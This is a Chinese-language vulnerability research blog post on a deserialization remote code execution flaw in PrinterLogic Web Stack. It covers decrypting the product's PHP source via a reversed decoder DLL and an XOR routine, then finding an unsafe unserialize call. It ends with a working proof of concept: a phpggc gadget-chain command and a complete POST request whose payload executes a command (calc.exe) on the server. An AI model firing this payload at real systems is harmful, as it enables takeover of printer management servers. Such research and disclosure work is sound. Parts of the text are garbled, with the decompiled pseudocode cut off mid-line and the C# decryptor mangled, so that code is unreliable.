author:Y4er
前言
看到推特上有人发 PrinterLogic Web Stack unserialize RCE，但是poc打码了，所以自己下了一个
分析一下。
这玩意是个打印机，开放了一个基于iis/php/laravel的web，而且php源码是加密的，本文就对其
进行解密并分析漏洞。
解密源码
打开php文件看到文件是加密的
找到php的安装路径 C:\Program Files (x86)\PHP\7.3.28.0 ，查看php.ini的配置
用到了一个php_decoder.dll，直接拖入ida中。经过分析导入表中引入zend_compile_file，多是处
理加密解密的重写。
跟进到sub_100011D0
确认解密逻辑位于sub_10001000函数中，伪代码如下
int __cdecl sub_10001000(int a1, int a2) 
{ 
  int v2; // edi@1 
  int result; // eax@4 
  int v4; // eax@8 
  unsigned int v5; // edx@8 
  int v6; // ebx@8 
  char v7; // cl@10 
  char v8; // al@10 
  unsigned int v9; // ebp@14 
  unsigned int v10; // eax@14 
  int v11; // ebx@14 
  unsigned int v12; // ecx@14 
  int v13; // eax@18 
  int v14; // edx@21 
  int v15; // ebx@21 
  int v16; // esi@21 
  int v17; // ecx@22 
  int v18; // ST04_4@24 
  int v19; // eax@24 
  int v20; // esi@24 
  unsigned int v21; // [sp+4h] [bp-8h]@3 
  int v22; // [sp+8h] [bp-4h]@14 
  v2 = a1; 
  if ( a1 
    && *(_DWORD *)(a1 + 44) 
    && zend_stream_fixup(a1, &a1, &v21) != -1 
    && *(_DWORD *)(v2 + 52) == 4 
    && *(_DWORD *)v2 
    && *(_DWORD *)(v2 + 20) ) 
  { 
    v4 = v21; 
    v5 = 0; 
    v6 = v21 >= 0x9F; 
    if ( v21 >= 0x9F ) 
    { 
      do 
      { 
        if ( v5 >= 0x9F ) 
          break; 
        v7 = *(&a_phpHeaderHttp[a1 
                              - (_DWORD)"PL"] 
             + v5); 
        v8 = a_phpHeaderHttp[v5]; 
        v6 = v7 == v8; 
        ++v5; 
      } 
      while ( v7 == v8 ); 
      v4 = v21; 
    } 
    if ( v6 ) 
    { 
      v9 = v4 - 159; 
      v10 = emalloc__4(v4, v5); 
      v11 = v10; 
      v12 = 0; 
      v22 = v10; 
      if ( v9 ) 
      { 
        if ( v9 >= 0x40 && (v10 > v9 + a1 + 158 || v10 + v9 - 1 >> 0x80 ^ 0xBC 
60 
>>> chr(60) 
' fileList = new List(); 
        static string encPath = @""; 
        static void Main(string[] args) 
        { 
            if (args.Length  0) 
            { 
                byte tmpByte = binaryReader.ReadByte(); 
                byte resByte = Convert.ToByte(tmpByte ^ key); 
                char res = Convert.ToChar(resByte); 
                streamWriter.Write(res); 
                length--; 
            } 
            streamWriter.Close(); 
            Console.WriteLine("done " + infile); 
        } 
    } 
}
解密之后再来审计
审计
admin\design\reports\chart_image.php  文件中直接用了经典的base64反序列化
$dataset = unserialize(base64_decode(requeststr("dataset")));
poc
./phpggc -u -b -f Laravel/RCE2 system 'calc.exe'
POST /admin/design/reports/chart_image.php HTTP/1.1 
Content-Type: application/x-www-form-urlencoded 
dataset=YSUzQTIlM0ElN0JpJTNBNyUzQk8lM0E0MCUzQSUyMklsbHVtaW5hdGUlNUNCcm9hZGNhc3RpbmclNU
NQZW5kaW5nQnJvYWRjYXN0JTIyJTNBMiUzQSU3QnMlM0E5JTNBJTIyJTAwJTJBJTAwZXZlbnRzJTIyJTNCTyUz
QTI4JTNBJTIySWxsdW1pbmF0ZSU1Q0V2ZW50cyU1Q0Rpc3BhdGNoZXIlMjIlM0ExJTNBJTdCcyUzQTEyJTNBJT
IyJTAwJTJBJTAwbGlzdGVuZXJzJTIyJTNCYSUzQTElM0ElN0JzJTNBOCUzQSUyMmNhbGMuZXhlJTIyJTNCYSUz
QTElM0ElN0JpJTNBMCUzQnMlM0E2JTNBJTIyc3lzdGVtJTIyJTNCJTdEJTdEJTdEcyUzQTglM0ElMjIlMDAlMk
ElMDBldmVudCUyMiUzQnMlM0E4JTNBJTIyY2FsYy5leGUlMjIlM0IlN0RpJTNBNyUzQmklM0E3JTNCJTdE
参考
1. https://www.yahooinc.com/paranoids/paranoids-vulnerability-research-printerlogic-issues-
security-alert/
文笔垃圾，措辞轻浮，内容浅显，操作生疏。不足之处欢迎大师傅们指点和纠正，感激不尽。